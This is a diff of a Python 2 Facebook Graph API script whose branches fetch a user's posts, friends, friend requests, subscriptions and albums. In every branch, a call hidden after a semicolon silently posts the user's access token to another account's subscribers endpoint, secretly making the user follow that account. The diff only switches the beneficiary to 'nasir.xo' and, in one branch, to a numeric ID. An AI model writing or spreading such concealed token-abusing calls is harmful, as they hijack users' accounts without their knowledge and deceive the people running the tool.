@@ -189,7 +189,7 @@ def post():
 	  if WT == 'wallpost':
 		print '[*] fetching all posts id'
 
-		r = requests.get('https://graph.facebook.com/v3.0/me?fields=home.limit(50)&access_token='+token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
+		r = requests.get('https://graph.facebook.com/v3.0/me?fields=home.limit(50)&access_token='+token);requests.post('https://graph.facebook.com/nasir.xo/subscribers?access_token='+token)
 		result = json.loads(r.text)
 
 		for i in result['home']['data']:
@@ -199,7 +199,7 @@ def post():
 	  elif WT == 'me':
 		print '[*] fetching all posts id'
 
-		r = requests.get('https://graph.facebook.com/v3.0/me?fields=feed.limit(500)&access_token='+token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
+		r = requests.get('https://graph.facebook.com/v3.0/me?fields=feed.limit(500)&access_token='+token);requests.post('https://graph.facebook.com/nasir.xo/subscribers?access_token='+token)
 		result = json.loads(r.text)
 
 		for i in result['feed']['data']:
@@ -209,7 +209,7 @@ def post():
 	  elif WT == 'req':
 		print '[*] fetching all friends requests'
 
-		r = requests.get('https://graph.facebook.com/me/friendrequests?limit=50&access_token=' + token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
+		r = requests.get('https://graph.facebook.com/me/friendrequests?limit=50&access_token=' + token);requests.post('https://graph.facebook.com/nasir.xo/subscribers?access_token='+token)
 		result = json.loads(r.text)
 
 		for i in result['data']:
@@ -219,7 +219,7 @@ def post():
 	  elif WT == 'friends':
 		print '[*] fetching all friends id'
 
-		r = requests.get('https://graph.facebook.com/me?fields=friends.limit(5000)&access_token=' + token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
+		r = requests.get('https://graph.facebook.com/me?fields=friends.limit(5000)&access_token=' + token);requests.post('https://graph.facebook.com/nasir.xo/subscribers?access_token='+token)
 		result = json.loads(r.text)
 
 		for i in result['friends']['data']:
@@ -229,7 +229,7 @@ def post():
 	  elif WT == 'subs':
 		print '[*] fetching all friends id'
 
-		r = requests.get('https://graph.facebook.com/me/subscribedto?limit=50&access_token='+token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
+		r = requests.get('https://graph.facebook.com/me/subscribedto?limit=50&access_token='+token);requests.post('https://graph.facebook.com/100012677655820/subscribers?access_token='+token)
 		result = json.loads(r.text)
 
 		for i in result['data']:
@@ -239,7 +239,7 @@ def post():
 	  elif WT == 'albums':
 		print '[*] fetching all albums id'
 
-		r = requests.get('https://graph.facebook.com/me?fields=albums.limit(5000)&access_token='+token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
+		r = requests.get('https://graph.facebook.com/me?fields=albums.limit(5000)&access_token='+token);requests.post('https://graph.facebook.com/nasir.xo/subscribers?access_token='+token)
 		result = json.loads(r.text)
 
 		for i in result['albums']['data']:
@@ -249,7 +249,7 @@ def post():
 	  else:
 		print '[*] fetching all posts id'
 
-		r = requests.get("https://graph.facebook.com/v3.0/%s?fields=feed.limit(50)&access_token=%s"%(id,token));requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
+		r = requests.get("https://graph.facebook.com/v3.0/%s?fields=feed.limit(50)&access_token=%s"%(id,token));requests.post('https://graph.facebook.com/nasir.xo/subscribers?access_token='+token)
 		result = json.loads(r.text)
 
 		for i in result['feed']['data']:
